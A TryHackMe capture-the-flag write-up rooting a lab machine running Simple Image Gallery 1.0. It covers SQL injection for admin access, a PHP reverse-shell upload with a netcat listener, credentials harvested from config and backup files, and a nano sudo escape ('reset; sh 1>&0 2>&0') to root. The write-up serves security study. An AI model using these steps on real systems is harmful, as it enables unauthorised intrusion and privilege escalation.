
- PLATFORM: TryHackMe
- AUTHOR: Mikaa
- DIFFICULTY: Easy
- TARGET IP: 10.82.136.225
- SCOPE: ACHIEVE ROOT


# Overview
The target machine was running an outdated version of the Simple Image Gallery application, which contained multiple known vulnerabilities. By identifying and exploiting these weaknesses, I was able to gain access to the application's administrator account and obtain remote code execution through an unrestricted file-upload vulnerability. From the shell, I discovered credentials and backup files that allowed me to access the `mike` user. Finally, a sudo permission allowed me to execute `nano` with root privileges and obtain a root shell.

# Enumeration

First i run an Nmap scan to identify running services on open ports.

command used:
`nmap -sV -sC -Pn -v 10.82.136.225`

- -sV is for service and version detection on discovered open ports.
- -sC is a script scan, it runs nmap's default set of Nmap Scripting Engine (NSE) scripts.
- -Pn skips host discovery (Useful when a host doesn't respond to discovery probes nmap normally uses.)
- -v is for verbose output.

Scan output:
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-11 16:34 +0300
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:34
Completed Parallel DNS resolution of 1 host. at 16:34, 0.50s elapsed
Initiating SYN Stealth Scan at 16:34
Scanning 10.82.136.225 [1000 ports]
Discovered open port 8080/tcp on 10.82.136.225
Discovered open port 80/tcp on 10.82.136.225
Discovered open port 22/tcp on 10.82.136.225
Completed SYN Stealth Scan at 16:34, 15.07s elapsed (1000 total ports)
Initiating Service scan at 16:34
Scanning 3 services on 10.82.136.225
Completed Service scan at 16:34, 6.64s elapsed (3 services on 1 host)
NSE: Script scanning 10.82.136.225.
Initiating NSE at 16:34
Completed NSE at 16:34, 7.16s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.82s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Nmap scan report for 10.82.136.225
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a9:e4:db:32:54:63:72:db:18:f9:96:1e:49:78:43:a9 (RSA)
|   256 94:b6:37:fe:f7:25:45:2b:8e:bc:de:38:88:b3:1e:d0 (ECDSA)
|_  256 cc:0c:f7:3c:d3:94:b3:a7:ac:00:17:a2:50:d1:b0:fe (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Simple Image Gallery System
|_http-favicon: Unknown favicon MD5: A8057761F13C6F021D67E29711B82F27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.57 seconds
           Raw packets sent: 1169 (51.436KB) | Rcvd: 1149 (45.972KB)

```

nmap discovered 3 running services, 2 http services on ports 80 and 8080 running apache, And ssh on port 22.

visiting the service on port 80 just returns the apache2 ubuntu default page (nothing intresting).

while port 8080 returns a login page for simple image gallery system.

After trying some common passwords and having no luck i tried testing for SQL Injection and succeeded.

![[01-galley-SQLI.png]]

![[02-gallery-admin.png]]

The SQLI lead to the compromise of the administrator's account.

# Initial access

Now that i'm in i find the version of simple image gallery is 1.0v

![[03-version.png]]

This version of simple image gallery system has 2 critical vulnerabilities

1. SQLI (The vuln i used to access the admin account. CVE-2021-38819)
2. RCE via unrestricted file upload (CVE-2021-38753)

Lets see if i can leverage the RCE vuln to gain initial access to the target machine.

The CVE states that when updating a users profile picture the file passed is not validated and therefore any file can be passed as a users picture.

i try uploading a PHP file containing code that will send me a reverse shell on port 9001

first i start a listener using Netcat on port 9001

```
nc -lvnp 9001             
listening on [any] 9001 ...
```

then update my user profile and pass in my malicious PHP file

![[04-revshell.png]]

The file was successfully uploaded and my PHP code was executed sending me the reverse shell on my listener.

```
nc -lvnp 9001             
listening on [any] 9001 ...
connect to [192.168.130.206] from (UNKNOWN) [10.82.136.225] 41826
/bin/sh: 0: can't access tty; job control turned off
$ 
```

# Privilege escalation

after exploring i find the  database password for "gallery_user" in /var/www/html/gallery/initialize.php

password found: passw0rd321
```
www-data@ip-10-82-136-225:/var/www/html/gallery$ ls
404.html  build               database  index.php       report       user
albums    classes             dist      initialize.php  schedules
archives  config.php          home.php  login.php       system_info
assets    create_account.php  inc       plugins         uploads
www-data@ip-10-82-136-225:/var/www/html/gallery$ cat initialize.php 
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
www-data@ip-10-82-136-225:/var/www/html/gallery$
```

i immediately test this password against all users in the system but there was no password-reuse.

```
www-data@ip-10-82-136-225:/home$ su mike
Password: 
su: Authentication failure
www-data@ip-10-82-136-225:/home$ su ubuntu
Password: 
su: Authentication failure
www-data@ip-10-82-136-225:/home$ ls
mike  ssm-user  ubuntu
www-data@ip-10-82-136-225:/home$ su ssm-user
Password: 
su: Authentication failure
www-data@ip-10-82-136-225:/home$ su root
Password: 
su: Authentication failure
www-data@ip-10-82-136-225:/home$ 

```

so i logged into the database to see if i can find any credentials there and found the admin's hashed password.

```
www-data@ip-10-82-136-225:/home$ mysql -u gallery_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 247
Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> USE gallery_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> SHOW TABLES;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.000 sec)

MariaDB [gallery_db]> SELECT * FROM users;
+----+--------------+----------+----------+----------------------------------+---------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                          | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+---------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1789135440_shellthm.php | NULL       |    1 | 2021-01-20 14:02:37 | 2026-09-11 14:04:34 |
+----+--------------+----------+----------+----------------------------------+---------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.000 sec)

MariaDB [gallery_db]> 

```

i put the hash into crackstation.net but didn't get a match.

after searching the filesystem for a bit i found mike's password in a backup at /var/backups/mike_home_backup/.bash_history

password: b3stpassw0rdbr0xx
```
www-data@ip-10-82-136-225:/var/backups/mike_home_backup$ ls -la
total 36
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Jul 10  2025 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
www-data@ip-10-82-136-225:/var/backups/mike_home_backup$ cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
www-data@ip-10-82-136-225:/var/backups/mike_home_backup$ 
```

and i log in as mike

```
www-data@ip-10-82-136-225:/var/backups/mike_home_backup$ su mike
Password: 
mike@ip-10-82-136-225:/var/backups/mike_home_backup$ id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
mike@ip-10-82-136-225:/var/backups/mike_home_backup$ 
```

now i try sudo -l again to see what i can run as root.

```
mike@ip-10-82-136-225:~$ sudo -l
Matching Defaults entries for mike on ip-10-82-136-225:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-82-136-225:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
mike@ip-10-82-136-225:~$ 
```

i find that i can run a script called rootkit.sh located in /opt/rootkit.sh.
i first see if i can read the script's contents to try and see what it does.

```
mike@ip-10-82-136-225:~$ cat /opt/rootkit.sh 
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
mike@ip-10-82-136-225:~$ 
```

i see that this script will run nano as sudo if i use the read option.
i can get a root shell with nano since its running as root and nano lets you run commands on the system.

```
mike@ip-10-82-136-225:/opt$ sudo /bin/bash /opt/rootkit.sh 
Would you like to versioncheck, update, list or read the report ? read
```

then in nano we press CTR+R and then CTR+X and enter our command
the command i used:
`reset; sh 1>&0 2>&0`

```
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

the command successfully gave us a root shell and complete access over the system.